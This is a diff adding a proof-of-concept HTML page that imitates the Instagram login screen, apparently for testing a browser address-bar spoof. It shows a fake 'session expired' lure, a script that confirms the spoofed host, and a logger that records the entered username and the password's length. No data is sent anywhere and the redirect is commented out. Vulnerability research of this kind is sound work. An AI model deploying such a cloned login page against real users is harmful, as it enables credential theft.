@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Instagram</title>
+<link rel="icon" href="https://www.instagram.com/favicon.ico">
+<style>
+  body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text",system-ui,sans-serif;background:#fafafa;display:flex;align-items:center;justify-content:center;min-height:100vh}
+  .container{width:100%;max-width:350px;padding:20px;text-align:center}
+  .logo{font-family:"Billabong","cursive",serif;font-size:40px;margin-bottom:10px;color:#262626}
+  .subtitle{font-size:13px;color:#8e8e8e;margin-bottom:20px;line-height:1.4}
+  .input-wrap{margin-bottom:8px}
+  input{width:100%;padding:10px 12px;border:1px solid #dbdbdb;border-radius:6px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}
+  input:focus{border-color:#a8a8a8}
+  .btn{width:100%;padding:10px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-size:14px;font-weight:600;margin-top:6px;cursor:pointer}
+  .btn:disabled{opacity:.3}
+  .divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px;font-weight:600}
+  .divider::before,.divider::after{content:"";flex:1;border-bottom:1px solid #dbdbdb}
+  .divider::before{margin-right:16px}
+  .divider::after{margin-left:16px}
+  .fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:block;margin-top:16px}
+  .forgot{color:#00376b;font-size:12px;margin-top:12px}
+  .signup{margin-top:20px;padding:16px;border:1px solid #dbdbdb;border-radius:6px;background:#fff;font-size:14px;color:#262626}
+  .signup a{color:#0095f6;font-weight:600;text-decoration:none}
+  .evidence{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10px;color:#bbb;margin-top:20px;text-align:left;white-space:pre-wrap;max-height:150px;overflow:auto;background:#f0f0f0;padding:8px;border-radius:6px}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">Instagram</div>
+  <div class="subtitle">Your session has expired due to a security check.<br>Please log in again to continue.</div>
+
+  <div class="input-wrap">
+    <input id="u" type="text" placeholder="Phone number, username, or email" autocomplete="username">
+  </div>
+  <div class="input-wrap">
+    <input id="p" type="password" placeholder="Password" autocomplete="current-password">
+  </div>
+  <button class="btn" id="btn" disabled>Log In</button>
+
+  <div class="divider">OR</div>
+  <a class="fb-login" href="#">Log in with Facebook</a>
+  <div class="forgot"><a href="#" style="color:#00376b;text-decoration:none">Forgot password?</a></div>
+
+  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+
+  <div class="evidence" id="log"></div>
+  <div style="font-size:10px;color:#ccc;margin-top:10px;text-align:center">
+    PoC landing page for address bar spoof testing. No data is exfiltrated.
+  </div>
+</div>
+
+<script>
+/* Evidence logger — captures what an attacker WOULD get */
+var LOG=document.getElementById("log");
+function log(s){LOG.textContent+="["+new Date().toISOString().substr(11,12)+"] "+s+"\n"}
+
+log("landing loaded");
+log("host = "+location.host);
+log("href = "+location.href);
+log("referrer = "+(document.referrer||"(none)"));
+log("ua = "+navigator.userAgent.slice(0,80));
+
+/* Check what the address bar is showing */
+if(location.host.indexOf("instagram.com")===0){
+  log("ADDRESS BAR SHOWS instagram.com — SPOOF CONFIRMED");
+}else{
+  log("host does NOT start with instagram.com");
+  log("check address bar visually — narrow bar may still truncate to instagram.com");
+}
+
+/* Enable button when both fields have content */
+var u=document.getElementById("u"),p=document.getElementById("p"),btn=document.getElementById("btn");
+function check(){btn.disabled=!(u.value&&p.value)}
+u.addEventListener("input",check);
+p.addEventListener("input",check);
+
+btn.addEventListener("click",function(){
+  log("CAPTURED: user="+u.value+" pass="+"*".repeat(p.value.length)+" ("+p.value.length+" chars)");
+  log("(real attacker would POST to their server here)");
+  /* show success state */
+  btn.textContent="Redirecting...";
+  btn.disabled=true;
+  setTimeout(function(){
+    log("redirect to real instagram.com");
+    /* In a real attack, redirect to real IG to avoid suspicion */
+    /* window.location.href="https://www.instagram.com/"; */
+  },1500);
+});
+</script>
+</body>
+</html>
